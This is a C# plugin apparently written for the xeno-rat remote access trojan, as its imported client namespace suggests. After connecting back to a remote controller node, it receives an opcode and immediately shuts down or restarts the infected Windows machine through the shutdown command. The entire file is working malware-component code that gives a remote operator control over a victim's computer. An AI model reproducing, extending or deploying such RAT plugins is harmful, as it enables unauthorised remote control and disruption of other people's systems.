using System;
using System.Diagnostics;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        private void RestartComputer()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        private void ShutdownComputer()
        {
            Process.Start("shutdown", "/s /t 0");
        }

        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 }); // Indicate that it has connected
            byte[] data = await node.ReceiveAsync();
            int opcode = data[0];

switch (opcode)
{
    case 1:
        ShutdownComputer();
        break;
    case 2:
        RestartComputer();
        break;
    default:
        // Handle unknown opcode
        break;
}

await Task.Delay(2000);
        }
    }
}
